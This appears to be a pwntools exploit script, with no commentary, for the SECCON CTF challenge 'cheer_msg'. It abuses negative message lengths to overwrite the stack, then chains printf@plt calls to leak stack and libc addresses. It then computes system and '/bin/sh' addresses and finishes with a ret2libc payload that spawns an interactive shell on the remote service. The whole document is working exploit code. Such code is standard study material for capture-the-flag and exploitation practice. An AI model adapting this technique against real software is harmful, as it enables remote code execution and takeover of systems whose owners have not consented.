#!/usr/bin/python
from pwn import *

#r = process ("./cheer_msg")
r= remote ("cheermsg.pwn.seccon.jp", 30527)


def get_leak (l, name = "hi"):
  r.sendline (str (l))
  r.sendline (name)
  r.recvuntil ("Message : ")
 # print r.recv()

r.recvuntil (":)")
r.sendline ("-97")

#r.sendline ("A"*62)
main_start = 0x080485ca
#r.sendline ("AAAA"*13 + p32(main_start))
r.sendline ("AAAA"+p32(main_start)*14)

r.recvuntil ("Message : ")
data = r.recvline ()[:-1]

print data.encode('hex')

r.recvuntil (":)")


r.sendline ("-31")
r.sendline ("he")
r.recvuntil ("Message : ")


data = r.recvline ()[:-1][4:8][::-1]

stack_leak_offset = -260
base_offset = 0x001abc20

leak = int (data.encode ('hex'), 16)
print hex(leak)

leak_to_buf = 56

printf_target = leak + stack_leak_offset
target = leak - leak_to_buf - 4

main_leave = 0x08048632
ppr = 0x080487ae
pr = 0x080487af
pppr = 0x080487ad
printf_plt = 0x8048430

pay = p32(printf_plt) + p32(pr) + p32(printf_target) + p32(main_start)*4 + p32(target)*5 + p32(main_leave)* 3
#print pay

get_leak (-97, pay)
r.recvline ()
d = r.recvline ()[0:4][::-1]

libc_leak = int (d.encode ('hex'), 16)

log.info ("libc_leak: "+hex(libc_leak))

libc_base = libc_leak - base_offset

offset_system = 0x00040310
offset_str_bin_sh = 0x16084c
system = libc_base + offset_system
binsh = libc_base + offset_str_bin_sh

log.info ("system: " + hex(system))

main_printf = 0x080485e2
msg = 0x08048826

getsh = p32 (system) *9 + p32(binsh)*2
get_leak (-113, getsh)
r.interactive ()

